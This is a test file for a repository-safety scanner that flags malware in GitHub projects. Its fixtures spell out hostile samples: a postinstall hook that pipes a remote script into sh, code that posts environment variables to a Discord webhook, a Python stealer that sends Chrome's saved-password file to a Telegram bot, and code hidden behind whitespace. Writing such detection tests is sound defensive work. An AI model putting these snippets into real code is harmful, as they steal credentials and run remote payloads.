import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { analyzeRepoSafety, safetyBadge, SAFETY_FILE, safetyPriority } from "../src/lib/repo-safety";

// Suspicious strings are assembled at runtime so this file itself never looks like malware to a scanner.
const WEBHOOK = ["https://discord", ".com/api/web", "hooks/123456789012345678/abcDEF"].join("");
const TELEGRAM = ["https://api.tele", "gram.org/bot123456:ABC/sendMessage"].join("");
const B64 = "Y29uc29sZS5sb2coImhlbGxvIik7".repeat(4);

function repo(files: Record<string, string>, extra: string[] = [], meta?: Parameters<typeof analyzeRepoSafety>[0]["meta"]) {
  const entries = [...Object.keys(files), ...extra].map(path => ({ path, type: "blob", size: 100 }));
  return analyzeRepoSafety({ repo: "someone/tool", entries, contents: new Map(Object.entries(files)), partial: false, meta, now: Date.parse("2026-11-16T12:00:00Z") });
}

test("only code, scripts, manifests, docs and CI are read, own manifests first", () => {
  for (const f of ["index.js", "setup.py", "install.sh", "run.ps1", "README.md", "package.json", ".github/workflows/ci.yml", "src/main.py"]) assert.ok(SAFETY_FILE.test(f), f);
  for (const f of ["logo.png", "data.csv", "app.exe"]) assert.ok(!SAFETY_FILE.test(f), f);
  assert.ok(safetyPriority("package.json") < safetyPriority("node_modules/x/index.js"));
});

test("an npm package that steals on install is full of red flags", () => {
  const r = repo({
    "package.json": JSON.stringify({ name: "colors-plus", scripts: { postinstall: "curl -s http://198.51.100.7/p.sh | sh", test: "jest" } }),
    "index.js": `const d = JSON.stringify(process.env);\nfetch("${WEBHOOK}", { method: "POST", body: d });\neval(atob("${B64}"));`,
  });
  assert.equal(r.verdict, "red-flags");
  const ids = r.findings.map(f => f.id.split("-")[0]);
  for (const id of ["hook", "exfil", "eval", "env"]) assert.ok(ids.includes(id), id);
  assert.equal(r.findings.find(f => f.id.startsWith("hook"))?.severity, "high");
  assert.equal(r.findings.find(f => f.id.startsWith("exfil"))?.line, 2);
});

test("a Python stealer: hidden exec, browser passwords and a Telegram bot", () => {
  const r = repo({ "main.py": `import base64,os\npath = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')\nexec(base64.b64decode("${B64}"))\nrequests.post("${TELEGRAM}", data=open(path,'rb'))` });
  assert.equal(r.verdict, "red-flags");
  for (const id of ["credential", "eval", "exfil"]) assert.ok(r.findings.some(f => f.id.startsWith(id)), id);
});

test("a download lure: turn off Defender, password-protected zip, a committed .exe", () => {
  const r = repo({ "README.md": "# Free Spotify Premium\n1. Disable Windows Defender (false positive)\n2. Download Release.zip, password: 2026\n" }, ["Release.zip", "Setup.exe"]);
  assert.equal(r.verdict, "red-flags");
  for (const id of ["av", "zip", "binaries"]) assert.ok(r.findings.some(f => f.id.startsWith(id)), id);
  assert.equal(r.findings.find(f => f.id === "binaries")?.severity, "high");
});

test("code pushed off-screen with hundreds of spaces is flagged and shown", () => {
  const r = repo({ "app.js": `console.log("hi");${" ".repeat(300)}require("child_process").exec("curl x")` });
  const hidden = r.findings.find(f => f.id.startsWith("hidden"))!;
  assert.equal(hidden.severity, "high");
  assert.match(hidden.excerpt!, /⟶ require\("child_process"\)/);
});

test("ordinary projects stay quiet: install docs, CI, tests and vendored code are not red flags", () => {
  const r = repo({
    "package.json": JSON.stringify({ scripts: { prepare: "npm run build", build: "tsc" } }),
    "README.md": "Install: curl -fsSL https://example.com/install.sh | bash",
    ".github/workflows/ci.yml": "run: curl -fsSL https://example.com/install.sh | bash",
    "tests/env.test.js": "const saved = JSON.stringify(process.env);",
    "node_modules/dep/index.js": `eval(atob("${B64}"))`,
    "src/server.js": "const env = { ...process.env, NODE_ENV: 'production' };\napp.listen(3000);",
    "www/site.js": 'const cmd = "curl -sSf https://example.com/install.sh | sh";',
  });
  assert.equal(r.verdict, "no-red-flags");
  assert.equal(r.counts.high, 0);
  assert.equal(r.counts.medium, 0);
});

test("repository facts: a brand-new account and fast stars are worth reading, never a red flag on their own", () => {
  const r = repo({ "index.js": "console.log(1)" }, [], { fullName: "someone/tool", createdAt: "2026-11-01T00:00:00Z", stars: 900, ownerCreatedAt: "2026-11-13T00:00:00Z" });
  assert.equal(r.verdict, "check");
  assert.ok(r.findings.some(f => f.id === "owner-new" && f.title.includes("3 days")));
  assert.ok(r.findings.some(f => f.id === "stars-fast"));
});

test("excerpts are short and never carry long encoded blobs or secrets", () => {
  const key = ["sk", "live", "a1B2c3D4e5F6g7H8i9J0k1L2m3"].join("_");
  const r = repo({ "a.js": `eval(atob("${"QUJD".repeat(80)}")); const k = "${key}";` });
  const excerpt = r.findings[0].excerpt!;
  assert.ok(excerpt.length <= 181);
  assert.match(excerpt, /…\(\d+ characters\)/);
  assert.ok(!excerpt.includes(key));
});

test("the API is same-origin and rate limited, and the page states that a static check cannot prove safety", () => {
  const route = readFileSync(new URL("../src/app/api/repo-safety/route.ts", import.meta.url), "utf8");
  assert.match(route, /sameOrigin\(request\)/);
  assert.match(route, /acquireWork\(repoSafetyRules\(/);
  const page = readFileSync(new URL("../src/app/is-this-repo-safe/page.tsx", import.meta.url), "utf8");
  assert.match(page, /cannot prove/);
});

test("the README badge says only what the last check found, with its date", () => {
  const counts = { high: 0, medium: 0, low: 0, info: 0 };
  assert.deepEqual(safetyBadge(null), { right: "not checked yet", color: "neutral" });
  assert.deepEqual(safetyBadge({ verdict: "no-red-flags", counts, checkedAt: "2026-11-20T10:00:00Z" }), { right: "no red flags · 2026-11-20", color: "green" });
  assert.deepEqual(safetyBadge({ verdict: "check", counts }), { right: "read before running", color: "yellow" });
  assert.deepEqual(safetyBadge({ verdict: "red-flags", counts: { ...counts, high: 2 }, checkedAt: "2026-11-20T10:00:00Z" }), { right: "2 red flags · 2026-11-20", color: "red" });
});

test("badges, link previews and repository pages read the stored check and never download a repository", () => {
  for (const file of ["../src/app/badge/safe/[owner]/[repo]/route.ts", "../src/app/api/repo-safety-card/route.tsx", "../src/app/is-this-repo-safe/[owner]/[repo]/page.tsx"]) {
    const source = readFileSync(new URL(file, import.meta.url), "utf8");
    assert.match(source, /cachedRepoSafety\(/, file);
    assert.doesNotMatch(source, /checkRepoSafety|downloadRepositoryArchive/, file);
  }
  const fetcher = readFileSync(new URL("../src/lib/repo-safety-fetch.ts", import.meta.url), "utf8");
  assert.match(fetcher, /await storeRepoSafety\(result\)/);
  const result = readFileSync(new URL("../src/app/is-this-repo-safe/repo-safety-result.tsx", import.meta.url), "utf8");
  assert.match(result, /\/badge\/safe\/\$\{report\.repo\}\.svg/);
  assert.match(result, /report\.verdict !== "red-flags"/, "no badge offer for a repository with red flags");
});
